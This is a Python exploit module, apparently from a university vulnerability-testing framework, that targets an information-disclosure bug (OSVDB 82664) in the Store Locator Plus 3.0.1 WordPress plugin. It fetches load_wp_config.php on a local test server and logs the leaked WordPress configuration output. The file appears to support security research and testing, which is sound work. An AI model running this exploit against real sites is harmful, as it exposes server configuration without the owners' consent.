
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
import re

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82664A",                        
                  'Description' : "Information disclosure bug in load_wp_config.php.",
                  'References' : [['OSVDB','82664'],['http://www.osvdb.org/show/osvdb/82664']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "INFO",
                  'VulWikiPage' : "",
                  'Plugin' : "Store Locator Plus 3.0.1",
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/wordpress/wp-content/plugins/store-locator-le/core/load_wp_config.php")
        re_comp = re.compile('.+<body>(.+)<br />.*')
        info = re_comp.findall(driver.page_source)
    
        if ((len(info)>0) and info[0].find("wordpress") != -1):
            self.verified = True
            self.logger.info("Success: leaked info: %s", info[0])
        else:
            self.logger.error("failed to find leaked info")

        driver.cleanup()
        return                

    def verify(self):
        return self.verified
